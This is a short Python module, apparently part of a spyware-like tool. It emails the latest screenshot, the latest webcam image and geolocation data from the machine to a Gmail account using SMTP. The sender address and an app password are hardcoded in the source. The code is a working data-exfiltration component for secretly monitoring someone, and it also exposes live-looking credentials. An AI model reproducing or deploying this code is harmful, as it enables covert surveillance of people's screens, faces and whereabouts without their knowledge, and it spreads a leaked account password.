import smtplib
import os
from email.message import EmailMessage
from utils.geolocation import get_location

EMAIL_ADDRESS = "kpunithnaik25@gmail.com"
EMAIL_PASSWORD = "jssg nqkk nsqe tqfd"

def send_data_to_email(screenshot_folder, webcam_folder):
    msg = EmailMessage()
    msg["Subject"] = "Captured Webcam, Screenshot, and Location"
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS

    # Add location as text
    location = get_location()
    msg.set_content(f"Attached are the latest webcam and screenshot images.\n\nLocation Info:\n{location}")

    # Attach screenshot
    screenshot_file = sorted(os.listdir(screenshot_folder))[-1]
    screenshot_path = os.path.join(screenshot_folder, screenshot_file)
    with open(screenshot_path, "rb") as f:
        msg.add_attachment(f.read(), maintype="image", subtype="png", filename="screenshot.png")

    # Attach webcam
    webcam_file = sorted(os.listdir(webcam_folder))[-1]
    webcam_path = os.path.join(webcam_folder, webcam_file)
    with open(webcam_path, "rb") as f:
        msg.add_attachment(f.read(), maintype="image", subtype="png", filename="webcam.png")

    # Send the email
    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        smtp.send_message(msg)
